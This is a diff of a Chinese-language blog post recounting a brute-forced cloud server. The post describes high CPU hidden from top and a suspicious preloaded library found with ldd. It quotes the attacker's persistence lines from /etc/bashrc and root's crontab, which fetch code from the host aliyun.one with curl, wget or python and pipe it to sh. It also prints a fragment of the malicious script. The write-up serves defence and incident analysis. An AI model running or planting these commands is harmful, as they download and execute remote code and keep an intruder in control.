@@ -33,11 +33,12 @@
         <div id="content">
 <div class="section" id="id1">
 <h1>服务器被黑事件</h1>
-<p>在 /etc/bashrc 中</p>
-<pre class="literal-block">(curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;exec(urllib.urlopen(&quot;http://aliyun.one/pygo&quot;).read())')|sh &gt;/dev/null 2&gt;&amp;1 &amp;</pre>
-<p>在 /var/spool/cron/root 中</p>
-<pre class="literal-block">*/15 * * * * (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(&quot;http://aliyun.one&quot;).read())')|sh</pre>
-<p>ldd :</p>
+<p>刚买的腾讯云服务器，因为临时测试下性能，所以只是设置了一个简单的密码，结果发现
+被爆破。</p>
+<p>登录上服务器，发现 CPU 负载很高，但用 top 命令却无法找到是哪个进程在占用 CPU。
+参考了 <a class="reference external" href="https://mp.weixin.qq.com/s/1AF5cgo_hJ096LmX7ZHitA">这篇文章</a> ，使用
+ldd 查看 top 和 ps 的动态链接库，发现 <span class="docutils literal"><span class="pre">/usr/local/lib/libevent_core-0.12.so</span></span>
+比较可疑 :</p>
 <pre class="literal-block"># ldd  `which top`
 linux-vdso.so.1 =&gt;  (0x00007ffe21bc7000)
 /usr/local/lib/libevent_core-0.12.so (0x00007ff594420000)
@@ -119,6 +120,12 @@ libpcre.so.1 =&gt; /lib64/libpcre.so.1 (0x00007fdf0cba7000)
 libelf.so.1 =&gt; /lib64/libelf.so.1 (0x00007fdf0c98f000)
 libz.so.1 =&gt; /lib64/libz.so.1 (0x00007fdf0c779000)
 libbz2.so.1 =&gt; /lib64/libbz2.so.1 (0x00007fdf0c569000)</pre>
+<p>之后又找到了 <a class="reference external" href="https://www.anquanke.com/post/id/171523">另一篇文章</a> ，发现它描
+述的入侵案例和我遇到的一模一样，相关文件如下:</p>
+<p>在 /etc/bashrc 中:</p>
+<pre class="literal-block">(curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;exec(urllib.urlopen(&quot;http://aliyun.one/pygo&quot;).read())')|sh &gt;/dev/null 2&gt;&amp;1 &amp;</pre>
+<p>在 /var/spool/cron/root 中:</p>
+<pre class="literal-block">*/15 * * * * (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(&quot;http://aliyun.one&quot;).read())')|sh</pre>
 <p>脚本:</p>
 <pre class="literal-block">#&lt;script&gt;window.location.href=&quot;http://aliyun.com&quot;;&lt;/script&gt;&lt;!--
 export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
@@ -178,6 +185,7 @@ do
     fi
 done
 #--&gt;</pre>
+<p>Thanks for reading :)</p>
 <div class="section" id="references">
 <h2>References</h2>
 <p><a class="reference external" href="https://www.anquanke.com/post/id/171523">https://www.anquanke.com/post/id/171523</a></p>
@@ -187,7 +195,7 @@ done
         </div> <!-- content -->
 
         <div id="footer">
-        <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank">CC BY-NC-SA</a> 2018-2019 an9wer | powered by <a href="http://docutils.sourceforge.net/" target="_blank">docutils</a>
+        <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank">CC BY-NC-SA</a> 2018-2020 an9wer | powered by <a href="http://docutils.sourceforge.net/" target="_blank">docutils</a>
         </div> <!-- footer -->
 
     </div> <!-- main -->
